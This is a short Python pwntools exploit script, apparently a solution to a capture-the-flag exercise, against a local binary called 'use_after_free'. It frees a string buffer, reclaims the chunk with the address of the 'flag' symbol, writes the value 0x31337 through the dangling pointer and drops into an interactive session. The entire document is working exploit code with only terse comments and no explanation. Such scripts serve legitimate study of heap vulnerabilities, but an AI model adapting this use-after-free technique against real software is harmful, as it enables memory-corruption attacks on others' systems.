from pwn import *

elf = ELF("use_after_free")

p = elf.process()

def set_string(string):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", string)

def del_string():
    p.sendlineafter(b"> ", b"3")

def set_num(num):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"> ", str(num).encode())

set_string(b"AAAA")                    # read / dangling pointer
del_string()

set_num(elf.sym["flag"])   # 10 / python str type / realloc
                                # .encode() --> python bytes
set_string(p32(0x31337))        #use

p.interactive()
